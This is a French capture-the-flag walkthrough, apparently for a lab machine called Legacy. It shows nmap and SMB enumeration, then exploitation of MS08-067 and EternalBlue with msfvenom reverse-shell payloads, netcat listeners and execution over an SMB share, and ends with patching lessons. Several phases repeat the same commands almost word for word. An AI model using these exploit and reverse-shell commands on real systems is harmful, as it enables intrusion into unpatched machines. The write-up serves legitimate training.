![Cover](cover.png)

### Phase 1 : Reconnaissance & Brèche Initiale

Ma méthodologie débute par une phase de **Reconnaissance** classique pour identifier la surface d'attaque. Étant donné l'âge de la machine **Legacy**, je m'attends à trouver des services legacy potentiellement vulnérables.

#### 1. Scanning & Énumération de services

Je commence par un scan **TCP** exhaustif pour identifier les ports ouverts, suivi d'un scan **UDP** pour ne rien manquer des services **NetBIOS**.

```bash
# Scan TCP rapide sur tous les ports
nmap -sT -p- --min-rate 10000 -oA nmap/alltcp 10.10.10.4

# Scan UDP sur tous les ports
nmap -sU -p- --min-rate 10000 -oA nmap/alludp 10.10.10.4

# Scan de services (Version/Scripts) sur les ports identifiés
nmap -sC -sV -p 139,445 10.10.10.4
```

Le scan révèle les ports **139 (NetBIOS)** et **445 (SMB)**. L'empreinte du système d'exploitation (**OS Fingerprinting**) via les scripts **NSE** confirme qu'il s'agit d'un **Windows XP**.

#### 2. Énumération SMB

Je tente d'énumérer les partages via **Null Session** (sans authentification), mais les outils **smbmap** et **smbclient** retournent un accès refusé.

```bash
smbmap -H 10.10.10.4
smbclient -N -L //10.10.10.4
```

L'absence de **Null Auth** m'oriente vers la recherche de vulnérabilités critiques au niveau du protocole lui-même, plutôt que sur une mauvaise configuration des partages.

#### 3. Identification des vulnérabilités (Vulnerability Scanning)

Sur un système **Windows XP**, les vecteurs d'attaque via **SMB** sont historiquement nombreux. J'utilise les scripts **NSE** de **Nmap** ciblés sur les vulnérabilités **SMB**.

```bash
nmap --script smb-vuln* -p 445 10.10.10.4
```

Le résultat est sans appel : la cible est vulnérable à deux failles majeures permettant l'**Remote Code Execution (RCE)** :
*   **MS08-067** (CVE-2008-4250) : Une vulnérabilité dans le service **Server** via une requête **RPC** malformée.
*   **MS17-010** (EternalBlue - CVE-2017-0143) : La célèbre faille exploitée par WannaCry.

> **Schéma Mental :**
> L'objectif est d'exploiter **MS08-067**. Le script d'exploitation doit envoyer un chemin de fichier spécifiquement forgé au service **Server**. Lors de la **Canonicalization** (normalisation du chemin), un **Buffer Overflow** se produit dans la mémoire du système, permettant de détourner le flux d'exécution vers mon **Payload**.

#### 4. Brèche Initiale : Exploitation manuelle de MS08-067

Je choisis d'exploiter **MS08-067** sans utiliser Metasploit pour mieux comprendre le mécanisme. J'utilise un script Python public qui nécessite un **Payload** personnalisé.

**Étape A : Génération du Shellcode**
J'utilise **msfvenom** pour générer un **Reverse Shell** de type **Unstaged**. Je dois impérativement exclure les **Bad Characters** (caractères qui corrompent l'exploit en mémoire).

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
```

**Étape B : Configuration de l'exploit**
J'insère le **shellcode** généré dans le script Python. Je dois également sélectionner la cible correcte (**Target ID**) pour que les adresses mémoires (**Return Addresses**) correspondent à la version exacte de l'OS. Ici, je cible **Windows XP SP3 English (NX)**.

**Étape C : Exécution et obtention du Shell**
Je prépare mon listener **Netcat** et lance l'attaque.

```bash
# Sur ma machine d'attaque
nc -lnvp 443

# Exécution de l'exploit (Target 6 = XP SP3 English NX)
python ms08-067.py 10.10.10.4 6 445
```

La connexion est établie immédiatement. Je reçois un shell avec les privilèges **NT AUTHORITY\SYSTEM**.

```cmd
C:\WINDOWS\system32> echo %username%
%username%
```

L'absence de réponse à la commande `whoami` (inexistante sur XP par défaut) et la non-expansion de la variable `%username%` confirment mon accès au niveau **SYSTEM**. La brèche est totale.

---

### Phase 2 : Énumération Interne & Mouvement Latéral

Une fois l'accès initial obtenu via l'exploitation de **SMB**, je me retrouve avec un **Reverse Shell** sur une machine Windows XP. Contrairement aux systèmes modernes, l'énumération post-exploitation sur cette version legacy présente des particularités, notamment l'absence de certains outils natifs.

#### 1. Exploitation et Post-Exploitation via MS08-067

Pour obtenir un accès stable sans utiliser **Metasploit**, j'utilise un script Python exploitant la vulnérabilité **MS08-067**. Cette faille permet une **Remote Code Execution (RCE)** en envoyant une requête **RPC** forgée qui déclenche un **Stack Overflow** lors de la canonisation d'un chemin.

**Génération du Payload (Unstaged) :**
J'opte pour un payload **unstaged** (`windows/shell_reverse_tcp`) afin de pouvoir réceptionner la connexion simplement avec **Netcat**.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
```

> **Schéma Mental :**
> 1. **Crafting** : Génération d'un **Shellcode** personnalisé en excluant les **Bad Characters** spécifiques au protocole SMB.
> 2. **Injection** : Remplacement du **Shellcode** statique dans l'exploit Python.
> 3. **Targeting** : Sélection de l'empreinte mémoire (OS version/Language pack) pour aligner les **Gadgets** (ROP) et rediriger le flux d'exécution vers mon **Payload**.

#### 2. Alternative : Mouvement Latéral via MS17-010 (EternalBlue)

Si l'exploitation de **MS08-067** échoue, j'utilise **MS17-010**. Cette vulnérabilité repose sur une corruption de mémoire dans le driver `srv.sys`. L'outil `send_and_execute.py` simplifie le processus en téléversant et en exécutant un binaire de manière automatisée.

**Préparation de l'exécutable malveillant :**
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o rev.exe
python send_and_execute.py 10.10.10.4 rev.exe
```

#### 3. Énumération Interne & Vérification des Privilèges

Sur Windows XP, la commande `whoami` n'existe pas nativement. Pour confirmer mon niveau de privilège, je dois utiliser des méthodes alternatives ou importer mes propres outils.

**Vérification via variables d'environnement :**
La variable `%username%` ne s'exécute pas correctement si la session tourne sous le compte **SYSTEM**.
```cmd
echo %username%
# Si la sortie est "%username%", cela indique souvent un contexte SYSTEM ou un environnement restreint.
```

**Importation d'outils via SMB Pivot :**
Pour obtenir une confirmation formelle, je monte un partage **SMB** local pour exécuter un binaire `whoami.exe` provenant de ma machine d'attaque.

```bash
# Sur la machine d'attaque (Kali)
impacket-smbserver share /usr/share/windows-binaries/
```

```cmd
# Sur la machine cible (Legacy)
\\10.10.14.14\share\whoami.exe
```

> **Schéma Mental :**
> L'absence de binaires d'énumération impose la création d'un **Pivot** de fichiers. En utilisant le protocole **SMB** (déjà ouvert et autorisé), je contourne la nécessité de télécharger le fichier sur le disque (`Diskless execution` via le chemin UNC), ce qui réduit les traces forensiques.

#### 4. Accès aux Secrets

L'exploitation de ces vulnérabilités **SMB** me donne directement les privilèges **NT AUTHORITY\SYSTEM**. Il n'y a donc pas de phase d'**Escalade de Privilèges** supplémentaire requise. Je peux procéder à la récupération des flags :

```cmd
type "C:\Documents and Settings\john\Desktop\user.txt"
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
```

---

### Phase 3 : Élévation de Privilèges & Domination (Root/Admin)

Sur cette machine **Legacy**, l'étape d'**Exploitation** et d'**Élévation de Privilèges** est fusionnée. Les vulnérabilités identifiées ciblent des services s'exécutant avec les privilèges les plus élevés du système (**NT AUTHORITY\SYSTEM**). Je vais détailler ici deux vecteurs d'attaque manuels pour obtenir un accès total sans l'utilisation de Metasploit.

#### Vecteur 1 : Exploitation de MS08-067 (CVE-2008-4250)

Cette vulnérabilité critique réside dans le service **Server**. Elle permet une **Remote Code Execution (RCE)** via une requête RPC spécifiquement forgée qui déclenche un **Stack Overflow** lors de la canonisation d'un chemin d'accès.

> **Schéma Mental :** L'objectif est d'écraser l'adresse de retour (EIP) en mémoire via une corruption de pile dans `netapi32.dll`. Comme Windows XP ne possède pas de protections modernes comme l'ASLR de manière généralisée, je peux utiliser des adresses de gadgets statiques pour rediriger l'exécution vers mon **Shellcode**.

**1. Génération du Shellcode :**
J'utilise **msfvenom** pour générer un payload **Unstaged** (pour une utilisation directe avec `nc`). Je dois impérativement exclure les **Bad Characters** spécifiés dans le script d'exploitation.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
```

**2. Exécution de l'exploit :**
Après avoir injecté le shellcode dans le script Python, je cible la version spécifique du système (**Windows XP SP3 English**) pour que les offsets de mémoire correspondent.

```bash
# Lancement du listener
nc -lnvp 443

# Exécution de l'exploit (Target 6 = XP SP3 English)
python ms08-067.py 10.10.10.4 6 445
```

#### Vecteur 2 : Vecteur Alternatif via MS17-010 (EternalBlue)

Si le premier vecteur échoue, j'utilise **MS17-010**, qui exploite une faille dans la gestion des paquets **SMBv1**.

> **Schéma Mental :** L'exploit utilise une confusion de type et un dépassement de tampon dans le noyau (Kernel) pour obtenir des droits **SYSTEM**. J'utilise une version modifiée de l'exploit qui permet l'upload et l'exécution d'un binaire arbitraire via des **Named Pipes**.

**1. Préparation du binaire malveillant :**
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o shell.exe
```

**2. Déploiement :**
J'utilise le script `send_and_execute.py` qui automatise la connexion, l'exploitation et l'exécution du binaire.

```bash
python send_and_execute.py 10.10.10.4 shell.exe
```

---

### Analyse Post-Exploitation "Beyond Root"

Une fois le **System Shell** obtenu, je constate une particularité propre aux systèmes Windows XP : l'absence de l'utilitaire **whoami**.

#### Problématique du contexte utilisateur
Sur un système moderne, `whoami` confirme immédiatement les privilèges. Sur XP, la variable d'environnement `%username%` peut être utilisée, mais elle ne s'étend souvent pas correctement dans un contexte de service **SYSTEM**.

```cmd
C:\WINDOWS\system32> echo %username%
%username%
```

#### Solution : Transfert de binaires via SMB
Pour confirmer mon identité de manière formelle, je transfère le binaire `whoami.exe` depuis ma machine d'attaque. J'utilise **Impacket-smbserver** pour créer un partage local, évitant ainsi d'écrire sur le disque de la cible (exécution via le réseau).

```bash
# Sur Kali : Partage du répertoire contenant les binaires Windows
impacket-smbserver tools /usr/share/windows-binaries/
```

```cmd
# Sur la cible : Exécution directe via le chemin UNC
\\10.10.14.14\tools\whoami.exe
```

**Résultat :** `NT AUTHORITY\SYSTEM`

#### Analyse de la surface d'attaque résiduelle
La compromission totale de **Legacy** démontre l'importance critique du **Patch Management**. Bien que la machine soit "Rootée", l'analyse montre que :
1.  **SMB Signing** était désactivé, facilitant l'interaction avec les services.
2.  Le service **Browser** (via `\pipe\browser`) était accessible de manière anonyme, servant de point d'entrée pour les appels RPC de **MS08-067**.
3.  L'absence de **DEP (Data Execution Prevention)** sur certains processus permettait une exécution de shellcode simplifiée en pile.